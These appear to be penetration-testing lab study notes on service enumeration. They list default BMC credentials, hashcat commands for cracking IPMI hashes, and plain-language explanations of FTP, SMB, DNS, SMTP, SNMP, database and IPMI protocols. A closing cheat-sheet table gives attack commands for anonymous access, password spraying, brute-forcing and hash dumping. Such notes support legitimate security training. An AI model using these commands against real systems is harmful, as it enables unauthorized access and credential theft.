During an internal security assessment, always check the web interfaces or command line endpoints of discovered BMCs for factory default credentials before attempting offline attacks:

| **Hardware Vendor / Product** | **Default Username** | **Default Password**                                           |
| ----------------------------- | -------------------- | -------------------------------------------------------------- |
| **Dell iDRAC**                | `root`               | `calvin`                                                       |
| **Supermicro IPMI**           | `ADMIN`              | `ADMIN`                                                        |
| **HP iLO**                    | `Administrator`      | _Randomized 8-character string (Upper-case letters + numbers)_ |

### 🛡️ Post-Exploitation: Offline Cracking Configuration

If the dumped hash contains a non-default password, save the hash string to a flat file (e.g., `ipmi.txt`) and run an offline dictionary attack.

* **Hashcat Mode Number:** **`7300`** (IPMI2 RAKP HMACC-SHA1 / HMAC-MD5)

#### Target Attack Syntax (HP iLO Factory Mask Attack Example)

If targeting an HP iLO device that still uses its default 8-character configuration structure, you can optimize your time using a custom mask attack character set (`?d` for decimals, `?u` for uppercase):

Bash

```
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

***

***

## summary

### 📂 File Sharing Protocols

#### 1. FTP (File Transfer Protocol) — Port 21

* **What it does:** It is a simple method designed purely for moving files from one computer to another over a network.
* **Analogy:** Think of it like a digital filing cabinet. You connect to it to either upload a file or download one to your local machine.

#### 2. SMB (Server Message Block) — Port 445

* **What it does:** Primarily used in Windows networks, SMB allows computers on the same network to share access to files, printers, and serial ports.
* **Analogy:** Like a "Shared Network Drive" in an office. Multiple people can open, read, and live-edit a document directly inside that folder without downloading it first.

#### 3. NFS (Network File System) — Port 2049

* **What it does:** This does the exact same job as SMB, but it is the native standard for Linux and Unix-based systems. It allows a remote directory to be "mounted" onto your local machine.
* **Analogy:** It tricks your Linux computer into thinking a folder sitting on a server 1,000 miles away is just an extra hard drive plugged directly into your machine.

### 🌐 Directory & Management Protocols

#### 4. DNS (Domain Name System) — Port 53

* **What it does:** It acts as the "phonebook" of the network. It translates human-readable names (like `inlanefreight.htb`) into machine-readable numbers (like `10.129.51.103`).
* **Analogy:** When you want to call a friend, you type their name in your phone, but the network uses their actual phone number to connect you. DNS handles that conversion.

#### 5. SNMP (Simple Network Management Protocol) — Port 161 (UDP)

* **What it does:** Used by system administrators to monitor, manage, and gather health statistics from network devices like routers, switches, and servers.
* **Analogy:** It’s like the dashboard warning lights on a car. It tells the administrator if a server's engine is overheating (high CPU usage), low on fuel (running out of disk space), or if a network cable was unplugged.

### 📧 Email Infrastructure Protocols

#### 6. SMTP (Simple Mail Transfer Protocol) — Port 25

* **What it does:** This protocol is strictly responsible for **sending/transferring** emails from a client to a server, or between different mail servers.
* **Analogy:** The mail carrier who takes a letter from your mailbox and transports it across the country to the target post office.

#### 7. IMAP / POP3 — Ports 143 / 110

* **What it does:** These protocols are used to **retrieve/read** emails that are sitting on a mail server.
  * **POP3:** Downloads the email to your device and deletes it from the server.
  * **IMAP:** Synchronizes your mail across multiple devices, leaving the original copy safely on the server.
* **Analogy:** P.O. Boxes. POP3 physically takes the letter out of the box and hands it to you. IMAP lets you look through a glass window to read and organize your mail while leaving the letters inside the box.

### 🗄️ Database Management Services

#### 8. MySQL — Port 3306

* **What it does:** A highly popular, open-source Relational Database Management System (RDBMS). It uses Structured Query Language (SQL) to store and organize structured data.
* **Analogy:** A massive, highly organized Excel workbook containing thousands of spreadsheets (tables) containing user profiles, order histories, and website content.

#### 9. MSSQL (Microsoft SQL Server) — Port 1433

* **What it does:** Microsoft's enterprise-tier relational database engine. It does essentially the same thing as MySQL but is heavily integrated into Windows ecosystems and corporate internal networks.

#### 10. Oracle TNS (Transparent Network Substrate) — Port 1521

* **What it does:** A proprietary Oracle networking technology. It acts as a "traffic controller" or "listener" that allows client applications to find and establish stable connections to backend Oracle Databases.

### 🛠️ Bare-Metal Hardware Control

#### 11. IPMI (Intelligent Platform Management Interface) — Port 623 (UDP)

* **What it does:** This is a hardware-level management service that runs on physical servers. It allows system administrators to monitor the actual physical hardware (power supply, fan speeds, temperature) and control the system completely out-of-band.
* **Analogy:** A remote control for the physical computer chassis. It allows an administrator to turn a crashed server completely off and back on again, or modify the motherboard's BIOS settings, **even if the main Operating System is entirely dead or frozen.**

Here is the complete network infrastructure service enumeration guide consolidated into a clear, scannable table format for quick reference during your labs.

| **Service**     | **Default Port(s)**                       | **Core Enumeration Process**                                                                                                                                             | **Primary Tools & Commands**                                                                                                                                                                                                  |
| --------------- | ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **FTP**         | 21 (TCP)                                  | <p>• Check for Anonymous Login.<br><br><br><br>• Identify outdated daemon versions.<br><br><br><br>• Recursively download available files.</p>                           | <p><code>nmap -p 21 --script ftp-anon &#x3C;TARGET_IP></code><br><br><br><br><code>ftp &#x3C;TARGET_IP></code> <em>(User: anonymous)</em><br><br><br><br><code>wget -r ftp://anonymous:anonymous@&#x3C;TARGET_IP>/</code></p> |
| **SMB**         | 139 / 445 (TCP)                           | <p>• Check for Null Sessions.<br><br><br><br>• List exposed network shares.<br><br><br><br>• Enumerate users, groups, and password policies.</p>                         | <p><code>netexec smb &#x3C;TARGET_IP> --shares -u '' -p ''</code><br><br><br><br><code>smbclient -L //&#x3C;TARGET_IP>/ -N</code><br><br><br><br><code>enum4linux-ng -A &#x3C;TARGET_IP></code></p>                           |
| **NFS**         | 2049 (TCP)                                | <p>• List exposed folder paths (mounts).<br><br><br><br>• Mount the share locally on Kali.<br><br><br><br>• Check for <code>no_root_squash</code> misconfigurations.</p> | <p><code>showmount -e &#x3C;TARGET_IP></code><br><br><br><br><code>mount -t nfs &#x3C;TARGET_IP>:/&#x3C;PATH> /mnt/test -o nolock</code></p>                                                                                  |
| **DNS**         | 53 (TCP/UDP)                              | <p>• Attempt a Zone Transfer (AXFR).<br><br><br><br>• Perform reverse IP lookups to find hostnames.</p>                                                                  | <p><code>dig axfr @&#x3C;TARGET_IP> &#x3C;DOMAIN></code><br><br><br><br><code>fierce --dns-servers &#x3C;TARGET_IP> --domain &#x3C;DOMAIN></code></p>                                                                         |
| **SMTP**        | 25 / 465 / 587                            | <p>• Enumerate valid usernames (<code>VRFY</code> / <code>RCPT TO</code>).<br><br><br><br>• Check if the server acts as an Open Relay.</p>                               | <p><code>msfconsole -q -x "use auxiliary/scanner/smtp/smtp_enum; set RHOSTS &#x3C;TARGET_IP>; run"</code><br><br><br><br><code>nmap -p 25 --script smtp-open-relay &#x3C;TARGET_IP></code></p>                                |
| **IMAP / POP3** | <p>143, 993 /<br><br><br><br>110, 995</p> | <p>• Grab banners for version testing.<br><br><br><br>• Password-spray usernames found from other services.</p>                                                          | <p><code>openssl s_client -connect &#x3C;TARGET_IP>:993 -crlf</code><br><br><br><br><code>hydra -l &#x3C;USER> -P passwords.txt &#x3C;TARGET_IP> imap</code></p>                                                              |
| **SNMP**        | 161 (UDP)                                 | <p>• Brute-force the community string (<code>public</code>/<code>private</code>).<br><br><br><br>• Dump system configs, running processes, and users.</p>                | <p><code>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt &#x3C;TARGET_IP></code><br><br><br><br><code>snmpwalk -v2c -c public &#x3C;TARGET_IP></code></p>                                                          |
| **MySQL**       | 3306 (TCP)                                | <p>• Test for default <code>root</code> account with empty password.<br><br><br><br>• Enumerate database names, schemas, and privileges.</p>                             | <p><code>nmap -p 3306 --script mysql-empty-password &#x3C;TARGET_IP></code><br><br><br><br><code>mysql -h &#x3C;TARGET_IP> -u root</code></p>                                                                                 |
| **MSSQL**       | 1433 (TCP)                                | <p>• Brute-force/test default admin credentials (<code>sa</code>).<br><br><br><br>• Check if <code>xp_cmdshell</code> is available for direct RCE.</p>                   | <p><code>impacket-mssqlclient sa@&#x3C;TARGET_IP> -windows-auth</code><br><br><br><br><code>netexec mssql &#x3C;TARGET_IP> -u sa -p 'password'</code></p>                                                                     |
| **Oracle TNS**  | 1521 (TCP)                                | <p>• Enumerate the System Identifier (SID) first.<br><br><br><br>• Brute-force default accounts (<code>SYS</code>, <code>SYSTEM</code>, <code>SCOTT</code>).</p>         | <p><code>odat sidguesser -s &#x3C;TARGET_IP></code><br><br><br><br><code>odat passwordguesser -s &#x3C;TARGET_IP> -d &#x3C;SID></code></p>                                                                                    |
| **IPMI**        | 623 (UDP)                                 | <p>• Identify IPMI 2.0 protocol endpoints.<br><br><br><br>• Request password hashes for valid users to crack offline.</p>                                                | <p><code>msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS &#x3C;TARGET_IP>; run"</code><br><br><br><br><code>hashcat -m 7300 hashes.txt rockyou.txt</code></p>                                        |
